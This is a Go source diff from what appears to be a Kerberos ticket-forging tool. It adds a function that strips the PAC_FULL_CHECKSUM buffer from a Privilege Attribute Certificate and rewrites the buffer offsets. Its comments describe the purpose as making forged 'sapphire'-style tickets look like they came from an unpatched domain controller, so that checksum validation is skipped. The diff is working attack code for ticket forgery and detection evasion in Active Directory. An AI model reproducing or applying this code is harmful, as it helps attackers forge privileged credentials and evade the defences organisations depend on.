@@ -452,10 +452,15 @@ func getBufferTypeName(t uint32) string {
 		return "ATTRIBUTES_INFO"
 	case RequestorType:
 		return "REQUESTOR_SID"
+	case FullChecksumType:
+		return "FULL_CHECKSUM"
 	default:
 		return "UNKNOWN"
 	}
 }
+
+// GetBufferTypeName returns the canonical PAC buffer type name (exported wrapper).
+func GetBufferTypeName(t uint32) string { return getBufferTypeName(t) }
 
 func getChecksumTypeName(t int32) string {
 	switch t {
@@ -876,6 +881,95 @@ const (
 	PACWasRequested        uint32 = 0x00000001 // Client sent pA-PAC-REQUEST (normal AS-REQ)
 	PACWasGivenImplicitly  uint32 = 0x00000002 // KDC gave PAC without explicit request (S4U2Self)
 )
+
+// FullChecksumType is PAC_FULL_CHECKSUM (MS-PAC 2.8.1, added in KB5020805, Nov 2022).
+// Keyed HMAC over the entire PAC using the KDC key; explicitly designed to detect
+// PAC transplantation attacks like sapphire. DCs predating KB5020805 never emit it.
+const FullChecksumType uint32 = 19
+
+// RemovePACFullChecksum strips the PAC_FULL_CHECKSUM buffer (type 19) from the PAC.
+//
+// The buffer is recomputed by the KDC on patched DCs and would need to be
+// recomputed after any PAC mutation to remain valid. Removing it instead makes
+// the PAC look like it was issued by a pre-KB5020805 DC — detections that
+// validate type-19 if present but don't require its presence will skip validation.
+//
+// Structural: removes one 16-byte buffer-info entry from the header array and
+// the (aligned) 16 bytes of buffer data, then rewrites all remaining buffers'
+// data offsets to account for both shrinks. Decrements cBuffers by 1.
+//
+// Must run BEFORE re-signing so that SERVER_CHECKSUM and KDC_CHECKSUM cover
+// the new (shrunk) PAC layout.
+//
+// Returns the modified PAC bytes and 1 if a type-19 buffer was removed, 0 otherwise.
+func RemovePACFullChecksum(pacData []byte) ([]byte, int) {
+	parsed, err := ParsePACForSigning(pacData)
+	if err != nil {
+		return pacData, 0
+	}
+
+	var targetBuf *PACBuffer
+	targetIdx := -1
+	for i := range parsed.Buffers {
+		if parsed.Buffers[i].Type == FullChecksumType {
+			targetBuf = &parsed.Buffers[i]
+			targetIdx = i
+			break
+		}
+	}
+	if targetBuf == nil {
+		return pacData, 0
+	}
+
+	removedDataAligned := (int(targetBuf.Size) + 7) &^ 7
+	newPACSize := len(pacData) - 16 - removedDataAligned
+	newPAC := make([]byte, newPACSize)
+
+	// New header: decremented cBuffers, same Version
+	binary.LittleEndian.PutUint32(newPAC[0:4], uint32(len(parsed.Buffers)-1))
+	binary.LittleEndian.PutUint32(newPAC[4:8], parsed.Version)
+
+	// Compute new data offset for a remaining buffer:
+	//   - Info array is 16 bytes smaller → all data shifts up by 16
+	//   - If this buffer's data came AFTER the removed buffer's data,
+	//     also shift up by the removed data's aligned size
+	newOffsetOf := func(origOffset uint64) uint64 {
+		if origOffset < targetBuf.Offset {
+			return origOffset - 16
+		}
+		return origOffset - 16 - uint64(removedDataAligned)
+	}
+
+	// Write remaining buffer-info entries (in original order, skipping target)
+	infoOff := 8
+	for i := range parsed.Buffers {
+		if i == targetIdx {
+			continue
+		}
+		buf := &parsed.Buffers[i]
+		binary.LittleEndian.PutUint32(newPAC[infoOff:], buf.Type)
+		binary.LittleEndian.PutUint32(newPAC[infoOff+4:], buf.Size)
+		binary.LittleEndian.PutUint64(newPAC[infoOff+8:], newOffsetOf(buf.Offset))
+		infoOff += 16
+	}
+
+	// Copy buffer data to new offsets
+	for i := range parsed.Buffers {
+		if i == targetIdx {
+			continue
+		}
+		buf := &parsed.Buffers[i]
+		oldStart := int(buf.Offset)
+		oldEnd := oldStart + int(buf.Size)
+		if oldEnd > len(pacData) {
+			continue
+		}
+		newStart := int(newOffsetOf(buf.Offset))
+		copy(newPAC[newStart:], pacData[oldStart:oldEnd])
+	}
+
+	return newPAC, 1
+}
 
 // RewritePACAttributesRequested rewrites PAC_ATTRIBUTES_INFO.Flags from
 // PAC_WAS_GIVEN_IMPLICITLY (0x2) to PAC_WAS_REQUESTED (0x1).
